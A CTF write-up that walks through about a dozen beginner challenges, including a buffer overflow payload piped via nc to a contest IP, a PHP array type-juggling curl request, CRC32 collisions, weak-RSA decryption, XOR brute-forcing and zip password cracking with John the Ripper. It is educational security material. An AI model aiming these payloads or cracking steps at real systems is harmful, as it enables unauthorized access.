### bof

I used Ghidra to view the file, and found address of function we want to return to.

I couldn't be bothered to think about exact offsets, so I used this ruby/shell mix:

```
for i in `seq 1 100` ; do  ruby -e 'print "a"*'$i' + "\xb0\x91\x04\x08".b' |  nc 46.101.55.21 10001 ; done
```

### php juggling

Code had a comment with `index.txt` in it, which could be used to view source (with flag redacted).

It was doing something to `value`, so without thinking what exactly it's doing I just tried to see what would happen if `value` was an array, and it worked.

```
curl 'http://46.101.55.21:10002/php1/' --data 'value[]=&value[]='
```

### more php magic

Code could be viewed through `index.txt`.

It had something to do with `==` being stupid.

I opened https://repl.it/languages/php_cli and since I didn't remember how to loop strings in PHP, I wrote ruby one liner to generate code like:

```
<?php

function crc32_string($v){return sprintf("%08x", crc32($v) & 0xffffffff);}

if(crc32_string("a") == crc32_string('sectalkS2p')) { echo "a\n"; }
if(crc32_string("b") == crc32_string('sectalkS2p')) { echo "b\n"; }
if(crc32_string("c") == crc32_string('sectalkS2p')) { echo "c\n"; }
if(crc32_string("d") == crc32_string('sectalkS2p')) { echo "d\n"; }
if(crc32_string("e") == crc32_string('sectalkS2p')) { echo "e\n"; }
if(crc32_string("f") == crc32_string('sectalkS2p')) { echo "f\n"; }
if(crc32_string("g") == crc32_string('sectalkS2p')) { echo "g\n"; }
if(crc32_string("h") == crc32_string('sectalkS2p')) { echo "h\n"; }
...
if(crc32_string("zzx") == crc32_string('sectalkS2p')) { echo "zzx\n"; }
if(crc32_string("zzy") == crc32_string('sectalkS2p')) { echo "zzy\n"; }
if(crc32_string("zzz") == crc32_string('sectalkS2p')) { echo "zzz\n"; }
```

That gave me some collisions, and I used one of them to get the flag.

In retrospect, I could have used numbers not strings.

### t-rex

It was a Java jar, so first I ran it, then I unpacked it, and verified it still runs. So far so good.

I googled one at http://www.javadecompilers.com/result and used the online one.

I edited `userinterface/GameScreen.java` changing line that checked score to:

```
    if (this.mainCharacter.score >= 2) {
```

And recompiled and substituted just this one file.

After jumping two obstacles I got the flag.

### run me?

`strings run_me` revealed `"It's all correct, submit it as Flag{place_passphrase_here}."`
So that means I need to run it without flags.

I did `objdump -d run_me` (since it's faster than Ghidra) and there was a suspicious looking block:

```
4006b9:	c7 45 90 d9 00 00 00 	movl   $0xd9,-0x70(%rbp)
4006c0:	c7 45 94 fe 00 00 00 	movl   $0xfe,-0x6c(%rbp)
4006c7:	c7 45 98 c5 00 00 00 	movl   $0xc5,-0x68(%rbp)
4006ce:	c7 45 9c f4 00 00 00 	movl   $0xf4,-0x64(%rbp)
4006d5:	c7 45 a0 9e 00 00 00 	movl   $0x9e,-0x60(%rbp)
4006dc:	c7 45 a4 c7 00 00 00 	movl   $0xc7,-0x5c(%rbp)
4006e3:	c7 45 a8 9b 00 00 00 	movl   $0x9b,-0x58(%rbp)
4006ea:	c7 45 ac dc 00 00 00 	movl   $0xdc,-0x54(%rbp)
4006f1:	c7 45 b0 e7 00 00 00 	movl   $0xe7,-0x50(%rbp)
4006f8:	c7 45 b4 d2 00 00 00 	movl   $0xd2,-0x4c(%rbp)
4006ff:	c7 45 b8 f4 00 00 00 	movl   $0xf4,-0x48(%rbp)
400706:	c7 45 bc 93 00 00 00 	movl   $0x93,-0x44(%rbp)
40070d:	c7 45 c0 fe 00 00 00 	movl   $0xfe,-0x40(%rbp)
400714:	c7 45 c4 ff 00 00 00 	movl   $0xff,-0x3c(%rbp)
40071b:	c7 45 c8 f4 00 00 00 	movl   $0xf4,-0x38(%rbp)
400722:	c7 45 cc 9e 00 00 00 	movl   $0x9e,-0x34(%rbp)
400729:	c7 45 d0 de 00 00 00 	movl   $0xde,-0x30(%rbp)
400730:	c7 45 d4 f9 00 00 00 	movl   $0xf9,-0x2c(%rbp)
400737:	c7 45 d8 ce 00 00 00 	movl   $0xce,-0x28(%rbp)
40073e:	c7 45 dc e7 00 00 00 	movl   $0xe7,-0x24(%rbp)
400745:	c7 45 e0 d2 00 00 00 	movl   $0xd2,-0x20(%rbp)
40074c:	c7 45 e8 ab 00 00 00 	movl   $0xab,-0x18(%rbp)
```

I extracted all numbers with editor and brute forced all single byte xors on it:

```
msg = [0xd9, 0xfe, 0xc5, 0xf4, 0x9e, 0xc7, 0x9b, 0xdc, 0xe7, 0xd2, 0xf4, 0x93, 0xfe, 0xff, 0xf4, 0x9e, 0xde, 0xf9, 0xce, 0xe7, 0xd2, 0xab]

(0..255).map{|xi| p msg.map{|yi| xi^yi}.pack("C*") }
```

Return contained `rUn_5l0wLy_8UT_5uReLy\x00`

If this didn't work, I'd have used Ghidra.

### xor me

It was just a single byte XOR cipher, with known first character.

```
msg = "321815130f0c44062b1d072b07441911001c451a4d09"
msg = msg.scan(/../).map{|x| x.to_i(16)}
pp msg.map{|x| x ^ 'F'.ord ^ 50 }.pack("C*")
```

### rsa 1

I diffed `rsa1.py` and `rsa2.py` to see what changed, and huge hint was in the comments that it was just 200 bits not 200 bytes.
`n` could also be visually confirmed to be small.

I used a website at https://www.numberempire.com/numberfactorizer.php to factorize it.

It turned out I didn't have Python 3 installed, so I found some old Ruby code and just plugged different numbers.

```
require "openssl"

def extended_gcd(a, b)
  last_remainder, remainder = a.abs, b.abs
  x, last_x, y, last_y = 0, 1, 1, 0
  while remainder != 0
    last_remainder, (quotient, remainder) = remainder, last_remainder.divmod(remainder)
    x, last_x = last_x - quotient*x, x
    y, last_y = last_y - quotient*y, y
  end
  return last_remainder, last_x * (a < 0 ? -1 : 1)
end

def invmod(e, et)
  g, x = extended_gcd(e, et)
  raise "The maths are broken!" if g != 1
  x % et
end

def powmod(x, e, n)
  x.to_bn.mod_exp(e, n).to_s.to_i
end

p = 649824883866457775291306374031
q = 674575819861218066219722443819
n = 438356153800436570260977439886459586475430235173142998064389
e = 17
ct = 142763290053900041229710660922776814816752339985890983677605

phi = (p - 1) * (q - 1)
d = invmod(e, phi)

pt = powmod(ct, d, n)

puts pt.to_s(16).scan(/../).map{|x| x.to_i(16).chr}.join
```

### rsa 2

This one was actually easier. Unpadded RSA is just integer root.
I don't have integer root in ruby, but I have binary search, and it's good enough.
`max` (40 bytes) is there just to limit search to reasonable numbers.
If it wasn't big enough I'd just keep bouncing it. It's not really necessary for `n=17`.

```
n = 715843470301468154185077766042814263449608816603941007665132179456176786800489389844001152109355564263158770513588517312206292845569868184582187805411068404061348872110674396118639354236954430238623057066049002262945425590934064295880217409834314445387271079644121310337345758591339108056834182505368073545804090596015678670208080070854569372678881771856817292534637695708680519298699651303212190975690756126642233374233606134646566588133960165079411593606090190292512888973467050091178196927052821204345038914485178136942888648158929202975986813416846982446344949425770638079781241716264530138148817720490938503184532664249367912259274556677053099500414614420378654615091609081560313378666736410258264340746280969942835666282778209541546741405392364556861047333890900252234306372792215484633268868612550618588302629505151961522316459529572775915533470221288758740807846421110023232202596118772011278140514833232712404846844987101491106915059939447650972859620893568376046807516520308692150576568169670422504506375990989901279800303273885078141175036445179973932326038472443602229095891276876044379181968525998830025331161418109452759729149554468650890434988583777484596282233459677094910761113175345662311657981071150982895272377891
e = 17
ct = 6289409141986860354880259858801101157599780518764076165621700858425007621616449904189150496145673555682919859022617887570053009399980591731193603185873654806349484873310567251361440407534572474892070487284862480151386078323028792985266667053426421300379161290857576686976651055926878387662473566055510489152155361096305957902708962372247012956166756961555530880813238735425327216420847378030135133409632027873011085753153242676433000091788314637573413718457936497777495546581878964787139813260993442557875483454402760764067286335237533314094742121116124102742369122371276823680886700735466298129934311749341501506661813720690474865224607910707919528710885919243867655178044212092236408656578603792274806547322476816257001810180720639732599853685504660838585495580876853563565042625692899419558338449301708120437776338064673615803396135416901044034353332272976564133662270582855475525153182947542375395976484525388869875853731582154581868184521320388391946974869960931679975869

max = 256**40

pt = (1..max).bsearch{|x| x**e >= ct }

p pt.to_s(16).scan(/../).map{|x| x.to_i(16) }.pack("C*")
```

### b64 * 4

As the title says, it was Base64d four times.

```
require "base64"

msg = "
VTFkMFQyUnRTbGxSYms1aFYwZG9kMXBGYUhKYU1rWlpWRmRrYTFJeWFITlRWV2hyWkcxT2RWUnFR
a3BTTVZveFYyeGplRTVWYkVoUApWekZLVTBVMWMxZFVUbGRsVjBaWlZXcFdUUXBSTUVwdldXMHhV
bG95U1hwV2JteEtVMFUwTVZsNlRsTmlRWEJwVjBVeGJsZFdhRXRpClJXeElXa2Q0YTFOR1NuZFpi
VEZxV2pKS1dFOVliR0ZWTUVweFdXcEplR1F5U2toV2FsSktDbEl3V25wWmEwNURUVWRHU0ZaWFpH
dFMKTW5nd1YyeE5NR0ZWVG01alJ6RnBVakJhZFZwVVNrNWtNa3BYVVdzeFRrMHlaRFJEYkZwSllr
UnJTd289Cg=="

4.times do
  msg = Base64.decode64(msg)
end

puts msg
```

### chicks

I did `binwalk -e chicks.jpg` and it got me the flag.
There was some ZIP at the end, but `binwalk` handles all that on its own.

### v1de0

The title and "`Check out my cool 01110110 01101001 01100100 01100101 01101111`" description were hints.
Video seemed to be just flashing white and red frames

First I cornerted it to still frames and MD5ed them:

```
ffmpeg -i video.avi -f image2 image-%07d.png
md5 image*.png > video.txt
```

Then I converted those hashes to binary file. There were two possibilities which frame is 1, and it turned out result was base64.

```
require "base64"

data = open("video.txt").readlines
msg = data.map{|x|
  x =~ /b044b41ea0425e378c06a3bb73ca9372/ ? 0 : 1
}

msg = msg.join.scan(/.{8}/).map{|u| u.to_i(2).chr}.join

msg = Base64.decode64(msg)

open("lol.zip", "wb") {|x| x.print msg}
```

In `lol.zip` there were two files - unencrypted `hint.txt` which was actually wrong, and encrypted `flag.txt`.

I used John the Ripper:

```
/usr/local/Cellar/john-jumbo/1.9.0/share/john/zip2john lol.zip >lol.john
john lol.john
john --show lol.john
```

That got me password to the flag file.
